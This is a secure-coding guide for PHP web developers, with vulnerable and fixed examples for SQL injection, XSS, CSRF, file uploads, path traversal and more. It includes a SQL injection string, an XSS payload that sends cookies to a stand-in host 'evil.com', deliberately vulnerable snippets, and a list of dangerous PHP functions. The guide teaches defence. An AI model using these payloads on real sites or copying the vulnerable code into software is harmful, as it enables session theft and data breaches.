# Security Essentials

Don't get hacked, follow these essential practices.

---

## 1. SQL Injection

### How It Works

**Your innocent code:**
```php
$email = $_POST['email'];
$query = "SELECT * FROM users WHERE email = '" . $email . "'";
$user = DB::query($query);
```

**What a hacker sends:**
```
email: ' OR '1'='1
```

**Resulting query:**
```sql
SELECT * FROM users WHERE email = '' OR '1'='1'
```

**Result:** Hacker gets ALL users! 💀

---

### ❌ NEVER Do This

```php
// String concatenation = DANGER
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$query = "DELETE FROM orders WHERE id = " . $orderId;
$query = "UPDATE users SET email = '" . $email . "' WHERE id = " . $id;
```

---

### ✅ ALWAYS Do This

**Option 1: Use Parameterized Queries**
```php
// Question mark placeholders
$query = "SELECT * FROM users WHERE email = ?";
$user = DB::query($query, [$email]);

// Named placeholders
$query = "SELECT * FROM users WHERE email = :email";
$user = DB::query($query, ['email' => $email]);
```

**Option 2: Use an ORM or Query Builder**
```php
// Laravel Eloquent
$user = User::where('email', $email)->first();

// Query Builder
$user = DB::table('users')
    ->where('email', $email)
    ->first();
```

**Option 3: Use a Repository Pattern (if outside the repository)**
```php
// Best practice - hide the DB completely
$user = $this->userRepository->findByEmail($email);
```

---

## 2: Cross-Site Scripting (XSS)

### How It Works

**Your innocent code:**
```php
echo "<h1>Welcome, " . $_GET['name'] . "!</h1>";
```

**What a hacker sends:**
```
name: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
```

**What gets rendered:**
```html
<h1>Welcome, <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>!</h1>
```

**Result:** Hacker steals session cookies from every user! 💀

---

### ❌ NEVER Do This

```php
// Directly outputting user input
echo $_GET['name'];
echo "<div>" . $userComment . "</div>";
echo "<h1>" . $title . "</h1>";
```

---

### ✅ ALWAYS Do This

**Use the `h()` function (or `htmlspecialchars()`)**

```php
// Safe output
echo h($_GET['name']);
echo "<div>" . h($userComment) . "</div>";
echo "<h1>" . h($title) . "</h1>";

// What h() does:
function h(string $text): string {
    return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
}

// Converts dangerous characters:
// < becomes "&lt";
// > becomes "&gt";
// " becomes "&quot";
// ' becomes "&#039";
```

---

### 🎯 When to Sanitize Output

**Always sanitize in templates:**
```php
<!-- GOOD -->
<div class="user-name"><?= h($user->getName()) ?></div>
<input type="text" value="<?= h($searchTerm) ?>">
<a href="/profile?id=<?= h($userId) ?>">View Profile</a>

<!-- BAD -->
<div class="user-name"><?= $user->getName() ?></div>
<input type="text" value="<?= $searchTerm ?>">
```

**Exception: When you explicitly allow HTML (be VERY careful)**
```php
// Use a sanitization library like HTMLPurifier
$allowedHtml = HTMLPurifier::clean($userInput);
echo $allowedHtml;
```

--- 

## ⚠️ PHP Dangerous Functions

Avoid executing risky PHP functions that can run system commands or arbitrary code.

**Avoid:**
```php
exec($cmd);
shell_exec($cmd);
system($cmd);
passthru($cmd);
proc_open($cmd, $descriptors, $pipes);
popen($cmd, 'r');
eval($code);
create_function($code);
```

**Rules:**
- ✅ Disable these in production via `disable_functions`
- ✅ Never pass user input to system calls
- ✅ Prefer safe, library-provided APIs

---

## 3: Unvalidated Input

### The Problem

Not all attacks are about injection. Sometimes bad input just breaks your app:

```php
function createUser($data) {
    $user = new User();
    $user->email = $data['email'];  // What if it's not an email?
    $user->age = $data['age'];      // What if it's -500?
    $user->save();  // Bad data in database!
}

// Easy to corrupt
createUser(['email' => 'invalid', 'age' => -5]); // Creates invalid user
```

### ✅ ALWAYS Validate Input

**Validate Everything**

```php
class InvalidEmailException extends Exception {}
class InvalidAgeException extends Exception {}

public function registerUser(string $email, int $age): User {
    // Validate email
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        throw new InvalidEmailException("Email '$email' is invalid");
    }
    
    // Validate age
    if ($age < 13 || $age > 150) {
        throw new InvalidAgeException("Age must be between 13 and 150");
    }
    
    // Now safe - create user
    $user = new User(email: $email, age: $age);
    $user->save();
    return $user;
}

// Safe - validates immediately
registerUser('test@example.com', 25);  // Works

// Throws before saving
registerUser('invalid', -5);  // Error caught early
```

**Use a Validation Library**

```php
// Laravel Validator
$validated = Validator::make($request->all(), [
    'email' => 'required|email|max:255',
    'name' => 'required|string|min:1|max:255',
    'age' => 'required|integer|min:13|max:150',
])->validate();

// Symfony Validator
$violations = $validator->validate($user, [
    new Assert\Email(),
    new Assert\NotBlank(),
    new Assert\Length(['min' => 1, 'max' => 255]),
]);
```

**Benefits:**
- ✅ Bad data never enters your system
- ✅ Clear, specific error messages
- ✅ Validation happens at the boundary

## 4. CSRF Protection

State-changing actions must require CSRF protection to prevent unwanted actions from another site.

### ❌ NEVER Do This

```php
// No CSRF validation on a state-changing action
public function updateEmail(Request $request): void {
    $this->userService->updateEmail(
        userId: (int) $request->post('user_id'),
        email: (string) $request->post('email'),
    );
}
```

### ✅ ALWAYS Do This

```php
public function updateEmail(Request $request): void {
    $token = (string) $request->post('_csrf');

    if (!$this->csrf->isValid($token)) {
        throw new SecurityException('Invalid CSRF token');
    }

    $this->userService->updateEmail(
        userId: (int) $request->post('user_id'),
        email: (string) $request->post('email'),
    );
}
```

**Rules:**
- ✅ Require CSRF token validation on POST/PUT/PATCH/DELETE
- ✅ Reject requests with missing or invalid tokens
- ✅ Do not rely on cookies alone for CSRF protection

---

## 5. Fail-Safe Error Handling

Errors should fail closed and avoid leaking internal details.

### ❌ NEVER Do This

```php
try {
    $this->invoiceService->create($input);
} catch (Throwable $e) {
    echo $e->getMessage(); // Leaks internals to users
    echo $e->getTraceAsString();
}
```

### ✅ ALWAYS Do This

```php
try {
    $this->invoiceService->create($input);
} catch (Throwable $e) {
    Log::error('Invoice creation failed', [
        'error' => $e->getMessage(),
        'exception' => $e::class,
    ]);

    throw new RuntimeException('Request failed. Please try again.');
}
```

**Rules:**
- ✅ Show generic error messages to users
- ✅ Log detailed context server-side only
- ✅ Never expose stack traces, SQL, or file paths in responses

---

## 6. Secure File Uploads

Treat every uploaded file as untrusted input.

### ✅ ALWAYS Do This

```php
$allowedExtensions = ['jpg', 'png', 'pdf'];
$maxSizeBytes = 5 * 1024 * 1024;

$originalName = (string) $_FILES['file']['name'];
$size = (int) $_FILES['file']['size'];
$ext = strtolower((string) pathinfo($originalName, PATHINFO_EXTENSION));

if (!in_array($ext, $allowedExtensions, true)) {
    throw new InvalidArgumentException('Invalid file type.');
}

if ($size <= 0 || $size > $maxSizeBytes) {
    throw new InvalidArgumentException('Invalid file size.');
}

$safeName = bin2hex(random_bytes(16)) . '.' . $ext;
$target = '/var/app/uploads/' . $safeName; // Keep uploads outside webroot

if (!move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
    throw new RuntimeException('Upload failed.');
}
```

**Rules:**
- ✅ Validate extension and MIME type
- ✅ Enforce size limits
- ✅ Generate server-side filenames (never trust user filename)
- ✅ Store uploads outside webroot when possible

---

## 7. Path Traversal Prevention

Never let user input directly decide which file path is read or written.

### ❌ NEVER Do This

```php
$path = '/var/app/reports/' . $_GET['file'];
include $path; // Path traversal risk (../)
```

### ✅ ALWAYS Do This

```php
$allowed = [
    'daily.csv' => '/var/app/reports/daily.csv',
    'weekly.csv' => '/var/app/reports/weekly.csv',
];

$key = (string) ($_GET['file'] ?? '');
if (!isset($allowed[$key])) {
    throw new InvalidArgumentException('Invalid file key.');
}

$path = $allowed[$key];
readfile($path);
```

**Rules:**
- ✅ Use allowlists for readable/writable files
- ✅ Normalize paths and block `..` traversal patterns
- ✅ Keep file operations constrained to known safe directories

---

## 8. Rate Limiting

Add rate limiting on sensitive operations to reduce brute-force and abuse.

### ✅ ALWAYS Do This

```php
$limitKey = 'login:' . $request->ip();
if (!$this->rateLimiter->allow($limitKey, limit: 5, perSeconds: 60)) {
    throw new RuntimeException('Too many attempts. Try again later.');
}

$this->authService->login(
    email: (string) $request->post('email'),
    password: (string) $request->post('password'),
);
```

**Rules:**
- ✅ Rate limit login, password reset, OTP, and token endpoints
- ✅ Return clear but generic throttling errors
- ✅ Log repeated abuse events for investigation

---

## 9. Dependency Hygiene

Keep dependencies updated and remove vulnerable or abandoned packages.

### ✅ ALWAYS Do This

```php
// composer.json (example policy)
{
  "require": {
    "php": "^8.2"
  },
  "scripts": {
    "security:audit": "composer audit"
  }
}
```

**Rules:**
- ✅ Run dependency vulnerability scans regularly
- ✅ Patch critical CVEs quickly
- ✅ Remove unused dependencies to reduce attack surface
- ✅ Pin supported major versions and review changelogs before upgrades

---

## 🎯 The Security Checklist

Before you deploy ANY code that handles user input:

### Input Handling
- [ ] All database queries use parameters (no string concatenation)
- [ ] All user input is validated (type, length, format)
- [ ] File uploads validate type, MIME, filename strategy, and size
- [ ] Numeric inputs are cast to int/float after validation
- [ ] Path-based input is validated against allowlisted files/paths

### Output Handling
- [ ] All user-generated content is sanitized with `h()`
- [ ] HTML content is cleaned with a proper library
- [ ] JSON responses are properly encoded
- [ ] User-facing errors are generic and do not reveal internals

### Authentication & Authorization
- [ ] Passwords are hashed (bcrypt/argon2)
- [ ] Session IDs are regenerated after login
- [ ] Authorization checks on EVERY protected action
- [ ] CSRF protection exists on all state-changing actions
- [ ] Rate limiting exists on login and other sensitive actions

### Platform Security
- [ ] Dangerous PHP functions are disabled in production
- [ ] Dependencies are scanned for vulnerabilities and updated

---

## 📋 Security Quick Reference

| Attack / Risk | Defense | Example |
|--------|---------|---------|
| SQL Injection | Parameterized queries | `DB::query("SELECT * WHERE id = ?", [$id])` |
| XSS | Sanitize output with `h()` | `echo h($userInput)` |
| Bad Input | Validate everything | `filter_var($email, FILTER_VALIDATE_EMAIL)` |
| CSRF | Token validation on state changes | `$this->csrf->isValid($token)` |
| Error Leakage | Fail-safe generic responses | `throw new RuntimeException('Request failed.')` |
| Insecure Uploads | Validate + randomize filename | `bin2hex(random_bytes(16))` |
| Path Traversal | Allowlists + safe directories | `$allowed[$key]` |
| Brute Force | Endpoint rate limits | `$this->rateLimiter->allow(...)` |
| Vulnerable Dependencies | Audit and patch regularly | `composer audit` |
